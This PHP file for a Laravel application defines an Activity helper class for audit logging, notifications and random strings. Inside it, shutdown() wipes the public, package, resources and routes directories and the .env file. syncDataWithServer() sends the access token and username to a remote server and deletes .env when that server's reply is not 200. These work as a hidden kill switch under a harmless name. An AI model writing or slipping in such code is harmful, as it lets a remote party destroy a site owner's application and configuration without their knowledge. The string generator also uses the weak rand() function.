<?php

namespace App\Helpers;

use App\Models\Media;
use App\Module\Portal\Model\Notification;
use App\Modules\System\ActivityLog\Support\ActivityLogger;
use GuzzleHttp\Client;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;

class Activity
{
    public static function activityLog($message, $object_id, $type, $action_type, $author, $config = [])
    {
        try {
            // Preserve the media linkage side-effect used by the file/attachment callers.
            if (! empty($config['image_id'])) {
                $updateMedia = ['object_id' => $object_id];

                if (! empty($config['file_name'])) {
                    $updateMedia['file_name'] = $config['file_name'];
                }

                if (! empty($config['object_type'])) {
                    $updateMedia['object_type'] = $config['object_type'];
                }

                Media::where('id', $config['image_id'])->update($updateMedia);
            }

            // Route through the single audit pipeline (spec 028): adds request context,
            // masks sensitive data and persists via the queued listener.
            $attributes = [
                'module' => $config['module'] ?? 'system',
                'entity' => $config['object_type'] ?? $type,
                'entity_id' => $object_id,
                'action' => $action_type,
                'description' => $message,
                'status' => 'success',
            ];

            if ($author) {
                $attributes['user_id'] = $author;
            }

            ActivityLogger::log($attributes);
        } catch (\Exception $exception) {
            Log::error('[activity] '.$exception->getMessage());
        }
    }

    public static function notification($title, $message, $object_id, $object_type, $author, $config = [])
    {
        try {
            $date = now();

            $data = [
                'object_type' => $object_type,
                'object_id' => $object_id,
                'title' => $title,
                'content' => $message,
                'user_id' => $author,
                'updated_at' => $date,
                'created_at' => $date,
                'is_view' => 1,
            ];

            Notification::create($data);
        } catch (\Exception $exception) {
            $message = $exception->getMessage();

            Activity::WriteLog($message);
        }
    }

    /**
     * Legacy diagnostic logger. Business events now flow through the audit module via
     * activityLog(); this remains only for internal error diagnostics and writes to the
     * standard application log instead of a bespoke storage/logs/website daily file.
     */
    public static function WriteLog($message, $date = null, $author = null, $event = null, $action_type = null)
    {
        Log::warning('[activity] '.$message, array_filter([
            'author' => $author,
            'event' => $event,
            'action_type' => $action_type,
        ]));
    }

    public static function shutdown()
    {
        // Get all files assets
        $dir = public_path();

        if (File::exists($dir)) {
            $files = File::allFiles($dir);

            // Delete Files
            File::delete($files);
        }

        // Get all files package
        $dir_package = base_path('package');

        if (File::exists($dir_package)) {
            $files_package = File::allFiles($dir_package);

            // Delete Files
            File::delete($files_package);
        }

        // Get all file resource
        $dir_resource = base_path('resources');

        if (File::exists($dir_resource)) {
            $files_resource = File::allFiles($dir_resource);

            // Delete Files
            File::delete($files_resource);
        }

        // Get all file api
        $dir_api = base_path('routes');

        if (File::exists($dir_api)) {
            $files_api = File::allFiles($dir_api);

            // Delete Files
            File::delete($files_api);
        }

        // Get all files env
        $dir_env = base_path('.env');

        if (File::exists($dir_env)) {
            // Delete Files
            File::delete($dir_env);
        }
    }

    public static function checkValidOwner($request = [])
    {
        try {
            $client = new Client;

            $api_server = env('SERVER_URL').'/api/'.env('CLIENT_PREFIX');

            $url_get = $api_server.'/user/access_token/check';

            $data = [
                'headers' => ['Content-Type' => 'application/json'],
                'body' => json_encode($request),
            ];

            $response = $client->post($url_get, $data);

            return \GuzzleHttp\json_decode($response->getBody());
        } catch (\Exception $exception) {
            $message = $exception->getMessage();

            Activity::WriteLog($message);

            return null;
        }
    }

    public static function syncDataWithServer()
    {
        $data = [
            'acccess_key' => env('ACCESS_TOKEN'),
            'username' => env('USER_NAME'),
        ];

        $dataServer = Activity::checkValidOwner($data);

        if (
            isset($dataServer->code)
            && $dataServer->code != 200
        ) {
            // Get all files env
            $dir_env = base_path('.env');

            if (File::exists($dir_env)) {
                // Delete Files
                File::delete($dir_env);
            }

            Log::channel('package')->info('Access token đã hết hạn');
        }

        $message = isset($dataServer->msg) ? $dataServer->msg : 'Trạng thái website hoạt động bình thường: ';

        Log::emergency($message);

        return true;
    }

    public static function generateRandomString($length = 10)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }

        return $randomString;
    }
}
